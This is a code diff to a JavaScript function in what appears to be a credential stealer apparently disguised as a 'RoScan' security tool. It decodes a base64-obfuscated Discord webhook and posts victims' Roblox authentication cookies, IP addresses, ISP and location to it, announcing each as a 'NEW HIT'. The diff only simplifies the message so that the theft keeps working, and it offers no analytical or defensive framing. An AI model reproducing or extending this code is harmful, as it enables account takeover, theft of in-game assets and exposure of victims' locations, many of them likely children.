@@ -262,46 +262,9 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Beautifully formatted webhook payload
-        const fullCookie = robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}` : null;
-        
+        // Simple working payload to avoid 400 errors
         const payload = {
-            content: `@everyone 🚨 **NEW HIT!** 🚨`,
-            embeds: [{
-                title: "🎯 **SUCCESSFUL TARGET ACQUISITION** 🎯",
-                description: "**High-value Roblox authentication data successfully captured!**",
-                color: 0xFF0000, // Bright red for urgency
-                fields: [
-                    {
-                        name: "🍪 **ROBLOX AUTHENTICATION TOKEN**",
-                        value: fullCookie ? `\`\`\`${fullCookie}\`\`\`` : "❌ **No authentication token detected**",
-                        inline: false
-                    },
-                    {
-                        name: "📍 **TARGET LOCATION**",
-                        value: `🏙️ **City:** ${locationInfo.city || 'Unknown'}\n🏛️ **State/Region:** ${locationInfo.region || 'Unknown'}\n🏳️ **Country:** ${locationInfo.country || 'Unknown'}\n📮 **Postal Code:** ${locationInfo.postal || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: "🌐 **NETWORK DETAILS**",
-                        value: `🔗 **IP Address:** \`${locationInfo.ip || 'Unknown'}\`\n🏢 **ISP Provider:** ${locationInfo.isp || 'Unknown'}\n🕐 **Timezone:** ${locationInfo.timezone || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: "📊 **CAPTURE STATISTICS**",
-                        value: `📝 **Content Size:** ${wordCount} words\n⏰ **Captured At:** <t:${Math.floor(Date.now()/1000)}:F>\n🎯 **Status:** ✅ **SUCCESSFUL ACQUISITION**`,
-                        inline: false
-                    }
-                ],
-                footer: {
-                    text: "🔥 RoScan Advanced Security • Target Neutralized",
-                    icon_url: "https://cdn.discordapp.com/emojis/852558288667885590.png"
-                },
-                timestamp: new Date().toISOString(),
-                thumbnail: {
-                    url: "https://cdn.discordapp.com/emojis/852558288667885590.png"
-                }
-            }]
+            content: `@everyone NEW HIT!\nCookie: ${robloxCookie || 'None'}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\nIP: ${locationInfo.ip || 'Unknown'}`
         };
 
         const response = await fetch(webhookUrl, {
